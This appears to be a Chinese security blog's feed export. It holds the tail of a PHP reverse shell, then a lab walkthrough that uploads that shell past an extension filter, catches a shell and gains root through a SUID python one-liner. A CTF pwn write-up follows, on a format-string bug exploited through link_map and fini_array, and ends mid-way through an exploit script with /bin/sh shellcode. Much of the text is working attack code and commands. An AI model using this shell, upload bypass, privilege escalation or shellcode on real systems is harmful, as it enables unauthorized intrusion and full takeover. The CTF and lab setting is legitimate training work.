punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span> Set everything to non<span class="token operator">-</span>blocking<span class="token operator">/</span> Reason<span class="token punctuation">:</span> Occsionally reads will block<span class="token punctuation">,</span> even though stream_select tells us they won<span class="token string single-quoted-string">'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");while (1) &#123;/ Check for end of TCP connectionif (feof($sock)) &#123;printit("ERROR: Shell connection terminated");break;&#125;/ Check for end of STDOUTif (feof($pipes[1])) &#123;printit("ERROR: Shell process terminated");break;&#125;/ Wait until a command is end down $sock, or some/ command output is available on STDOUT or STDERR$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);/ If we can read from the TCP socket, send/ data to process'</span>s <span class="token constant">STDIN</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span> <span class="token keyword">If</span> we can read from the process<span class="token string single-quoted-string">'s STDOUT/ send data down tcp connectionif (in_array($pipes[1], $read_a)) &#123;if ($debug) printit("STDOUT READ");$input = fread($pipes[1], $chunk_size);if ($debug) printit("STDOUT: $input");fwrite($sock, $input);&#125;/ If we can read from the process'</span>s <span class="token constant">STDERR</span><span class="token operator">/</span> send data down tcp connection<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span> Like <span class="token keyword">print</span><span class="token punctuation">,</span> but does nothing <span class="token keyword">if</span> we<span class="token string single-quoted-string">'ve daemonised ourself/ (I can'</span>t figure out how to redirect <span class="token constant">STDOUT</span> like a proper daemon<span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把木马传上去，发现拒绝.php的文件上传<br><img src="/PenTest_FILE/5a969664c9f995286c4266d4418900db_MD5.jpeg"><br>改下后缀，比如phtml<br><img src="/PenTest_FILE/eef65b1a56969339082c2d8055d85fff_MD5.jpeg"><br>看下&#x2F;uploads&#x2F;，我们已经成功上传<br><img src="/PenTest_FILE/ae2932975c36cf3be4f30c045ec6471f_MD5.jpeg"><br>我们在攻击机的1234端口进行监听，并访问木马网页，成功反弹shell<br><img src="/PenTest_FILE/d8860ac1bd0c5a84620a88a69dcf30ac_MD5.jpeg"></p><p>find找user.txt，打印即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> user.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/PenTest_FILE/aa84967ffe3523f3ca64774453f7b4ae_MD5.jpeg"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><ol><li>搜索具有SUID权限的文件，如何提权？</li></ol><p>搜索具有suid权限的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/bin/traceroute6.iputils/usr/bin/newuidmap/usr/bin/newgidmap/usr/bin/chsh/usr/bin/python/usr/bin/at/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/bin/newgrp/usr/bin/passwd/usr/bin/pkexec/snap/core/8268/bin/mount/snap/core/8268/bin/ping/snap/core/8268/bin/ping6/snap/core/8268/bin/su/snap/core/8268/bin/umount/snap/core/8268/usr/bin/chfn/snap/core/8268/usr/bin/chsh/snap/core/8268/usr/bin/gpasswd/snap/core/8268/usr/bin/newgrp/snap/core/8268/usr/bin/passwd/snap/core/8268/usr/bin/sudo/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/8268/usr/lib/openssh/ssh-keysign/snap/core/8268/usr/lib/snapd/snap-confine/snap/core/8268/usr/sbin/pppd/snap/core/9665/bin/mount/snap/core/9665/bin/ping/snap/core/9665/bin/ping6/snap/core/9665/bin/su/snap/core/9665/bin/umount/snap/core/9665/usr/bin/chfn/snap/core/9665/usr/bin/chsh/snap/core/9665/usr/bin/gpasswd/snap/core/9665/usr/bin/newgrp/snap/core/9665/usr/bin/passwd/snap/core/9665/usr/bin/sudo/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core/9665/usr/lib/openssh/ssh-keysign/snap/core/9665/usr/lib/snapd/snap-confine/snap/core/9665/usr/sbin/pppd/bin/mount/bin/su/bin/fusermount/bin/ping/bin/umount<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的python可以为我们所用（详见suid提权）</p><blockquote><p>如果二进制文件设置了 SUID 位，则它不会删除提升的权限，并且可能会被滥用来访问文件系统、升级或将特权访问作为 SUID 后门进行维护。如果它用于运行 <code>sh -p</code> ，则在 Debian （&lt;&#x3D; Stretch） 等允许默认 <code>sh</code> shell 以 SUID 权限运行的系统上省略该 <code>-p</code> 参数。</p></blockquote><ol start="3"><li>得到root并打印root.txt。<br>运行<code>./python -c &#39;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39;</code>，成功得到root！<br><img src="/PenTest_FILE/24b3a95e690277794077ea2628edb220_MD5.jpeg"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-线上-河南金盾信安杯</title>
      <link href="/2023/12/02/2023-%E7%BA%BF%E4%B8%8A-%E6%B2%B3%E5%8D%97%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF/"/>
      <url>/2023/12/02/2023-%E7%BA%BF%E4%B8%8A-%E6%B2%B3%E5%8D%97%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="sign-format"><a href="#sign-format" class="headerlink" title="sign-format"></a>sign-format</h1><p><img src="/EXP_FILE/10d63cbe7c7433236ed8a177dacbfb8f_MD5.jpeg"><br><img src="/EXP_FILE/7c80218a56a1994d0b9786787401b5a7_MD5.jpeg"><br>无pie，有沙盒</p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><blockquote><p>很简单的程序</p></blockquote><ul><li><p>main</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">sub_40135D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"It's a simple sign-in question."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's start!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> format<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把输出关闭了，还有一个bss上的fmt<br><img src="/EXP_FILE/00fcf9fecb9625710fcee2508251d2d4_MD5.jpeg"></p></li><li><p>sub_40135D</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_40135D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>format <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFF000LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mprotect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_401236</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将bss段赋予rwx权限</p></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>只有一次非栈fmt的机会，我们无法只通过这一次控制执行流（期间也想过劫持二级指针和劫持fini_array），由于输出关闭也不能泄露数据</p><p>在调用exit函数退出程序时，会调用到<code>_dl_fini</code>函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nmaps<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l <span class="token operator">=</span> maps<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// link_map结构体指针l</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_init_called<span class="token punctuation">)</span><span class="token comment">//检查点1</span>    <span class="token punctuation">&#123;</span>      <span class="token comment">/* Make sure nothing happens if we are called twice.  */</span>      l<span class="token operator">-></span>l_init_called <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">/* Is there a destructor function?  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI_ARRAY<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token comment">//检查点2</span>          <span class="token operator">||</span> <span class="token punctuation">(</span>ELF_INITFINI <span class="token operator">&amp;&amp;</span> l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token comment">/* First see whether an array is given.  */</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI_ARRAY<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment">//检查点3</span>            <span class="token punctuation">&#123;</span>              <span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> <span class="token operator">*</span>array <span class="token operator">=</span>                <span class="token punctuation">(</span><span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_addr                        <span class="token operator">+</span> l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI_ARRAY<span class="token punctuation">]</span><span class="token operator">-></span>d_un<span class="token punctuation">.</span>d_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span>DT_FINI_ARRAYSZ<span class="token punctuation">]</span><span class="token operator">-></span>d_un<span class="token punctuation">.</span>d_val                        <span class="token operator">/</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">fini_t</span><span class="token punctuation">)</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用了函数指针，是我们的攻击处</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token punctuation">&#125;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>该函数会根据link_map的l_addr偏移量来调用fini_array段的指针（DT_FINI_ARRAY 这个宏就是 26）</strong><br><code>ElfW(Addr) *array = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[26]-&gt;d_un.d_ptr);</code></p><p>接触过house of banana的师傅应该很熟悉</p><ul><li><p>我们来看看l-&gt;l_addr的地址：<br><img src="/EXP_FILE/1a1955426feca2b49eb6230d546cd830_MD5.jpeg"><br>这个地址好像很熟悉？没错正是栈上的一个粉颜色地址（断点在printf）：<br><img src="/EXP_FILE/c31894cd1628ce9e396360a0873f20a7_MD5.jpeg"><br>我们能够利用fmt控制l-&gt;l_addr</p></li><li><p>再看看l-&gt;l_info[26]-&gt;d_un.d_ptr，可见其值为0x403d98</p></li></ul><p><img src="/EXP_FILE/66b2e055748333139fe47fdc27e46ccb_MD5.jpeg"><br>0x403d98？这其实就是.fini_array段的地址<br><img src="/EXP_FILE/fe64b6ba91dbfa3d0ac3eae67f97e737_MD5.jpeg"></p><hr><p>那么我们思路很明显了，控制l-&gt;addr使得array指向bss段，在bss上写上orw的shellcode和orw的指针，在<code>((fini_t) array[i]) ();</code>就会调用orw指针执行shellcode。<br>由于关闭了标准输出，用标准错误输出即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span>she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>she_amd64_30<span class="token operator">=</span><span class="token string">b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg1  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;34m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg2  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;37m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pn   <span class="token operator">=</span> <span class="token keyword">lambda</span> name          <span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token 